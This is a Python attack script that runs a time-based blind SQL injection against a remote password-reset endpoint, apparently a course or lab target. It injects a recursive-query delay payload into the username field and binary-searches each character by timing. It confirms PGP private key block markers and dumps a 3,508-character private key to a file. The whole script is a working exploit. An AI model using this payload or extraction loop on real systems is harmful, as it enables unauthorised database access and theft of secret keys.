import time
from statistics import median

import requests
from flask import Flask

from datetime import datetime


app = Flask(__name__)

API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
# API_URL = 'http://127.0.0.1:3000/reset'
API_RUNS = 10
THRESHOLD_SECONDS = 0.3
COUNTER_DELAY = 100000000
PREFIX = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
SUFFIX = "-----END PGP PRIVATE KEY BLOCK-----"


def check_payload_true(normal_reponse_time, sql_payload, threshold):
    sql_payload_time = measure_response_time(API_URL, sql_payload)
    if sql_payload_time > normal_reponse_time + threshold:
        # print(f"True for {sql_payload}")
        return True
    else:
        # print(f"False for {sql_payload}")
        return False


def build_sql_payload(condition):
    return {
        "username": "admin' AND (CASE WHEN (" + condition + ") THEN (SELECT sum(x) FROM (WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<" + COUNTER_DELAY.__str__() + ") SELECT x FROM cnt)) ELSE 0 END) like '1"}


def measure_response_time(url, input):
    start = time.perf_counter()
    r = requests.post(f"{url}", data=input)
    # print(f"Response: {r.text}")
    end = time.perf_counter()
    return end - start


def measure_avg_response_time(url, input):
    request_times = []
    for run in range(API_RUNS):
        request_time = measure_response_time(url, input)
        request_times.append(request_time)
    return median(request_times)


def discover_char(normal_reponse_time, key_index):
    low, high = 32, 126  # ASCII printable range
    while low <= high:
        mid = (low + high) // 2
        sql_payload = build_sql_payload(f"substr(key,{key_index + 1},1)>'{chr(mid)}'")
        char_is_higher = check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
        if char_is_higher:
            low = mid + 1
        else:
            high = mid - 1

    sql_payload = build_sql_payload(f"substr(key,{key_index + 1},1)=='{chr(high)}'")
    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
        return chr(high)
    return chr(low)


def chunk_verification(normal_reponse_time):
    sql_payload = build_sql_payload(f"substr(key,1,{len(PREFIX)})=='{PREFIX}'")
    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
        print("\n🚀 Prefix check passed")

    sql_payload = build_sql_payload("substr(key,1,1)=='-'")
    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
        print("\n🚀 First character check passed")

    key_length = 3508
    if (check_payload_true(normal_reponse_time, build_sql_payload("LENGTH(key)==" + key_length.__str__()), THRESHOLD_SECONDS)):
        print("\n🚀 Key Length : " + key_length.__str__())

    sql_payload = build_sql_payload(f"substr(key,{key_length - 2},1)=='-'")
    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
        print("\n🚀 Last character check passed")

    sql_payload = build_sql_payload(f"substr(key,{key_length - len(SUFFIX) + 1},{len(SUFFIX)})=='{SUFFIX}'")
    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
        print("\n🚀 Suffix check passed")


def sql_injection_attack():
    print("\n🚀 Starting Measurement of API")
    normal_input = {"username": "admin"}
    normal_reponse_time = measure_avg_response_time(API_URL, normal_input)

    chunk_verification(normal_reponse_time)

    with open(datetime.now().__str__() + ".txt", "a") as f:
        # after loop each position index of the key to find the character
        key = ""
        for key_index in range(3508):
            character = discover_char(normal_reponse_time, key_index)
            f.write(character)
            print(character)
            key = key + character
        print(f"🚀🔑 Key: {key}\n")


if __name__ == '__main__':
    sql_injection_attack()
